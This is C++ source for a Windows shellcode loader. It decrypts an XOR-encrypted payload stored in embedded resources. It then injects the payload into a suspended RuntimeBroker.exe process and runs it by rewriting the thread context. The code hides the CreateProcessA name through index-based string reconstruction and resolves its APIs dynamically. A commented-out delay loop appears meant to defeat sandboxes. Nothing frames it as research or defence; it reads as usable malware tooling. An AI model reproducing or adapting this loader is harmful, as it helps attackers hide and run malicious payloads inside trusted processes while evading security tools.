#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>
#include <string>  // Include this for std::string

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

// Function that performs the main logic when i == 1
std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
    std::string empty_string= "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
         char character = big_string[offsets[i]];
         empty_string += character;
     }
     return empty_string;
}

void main_star() {
    char* ke;
    DWORD keLen;
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    keLen = SizeofResource(hModule, hResource);
    ke = (char*)LockResource(resrdata);

    // Load the second resource (dhanushcode56)
    char* code199k;
    DWORD code199kLen;
    hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
    resrdata = LoadResource(hModule, hResource);
    code199kLen = SizeofResource(hModule, hResource);
    code199k = (char*)LockResource(resrdata);
    
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
    printf("\n");
    std::cout << getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  // Use std::cout
    
    const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";

    STARTUPINFO li = {0};
    
    HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");

    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
                          BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                          LPPROCESS_INFORMATION lpProcessInformation) = 
        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(istfromKernel32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());

    LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, "VirtualAllocEx");

    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, "WriteProcessMemory");

    PROCESS_INFORMATION pi = {0};
    li.cb = sizeof(li);

    itscreatetPro(processptaah, 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
    GetTickCount();

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);

    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)gallio;

    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &ctx);

    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, "ResumeThread");
    pResumeThread(pi.hThread); 
}

int main() {
    //unsigned long long i = 0;  // Change this value to control the flow

    //for(; i < 189642300000; i++) {
        //i += i % 0xff; 
    //}
    //printf("%llu\n", i);
    
    //if (i == 189642300001){
        main_star();
    //}

    return 0;
}
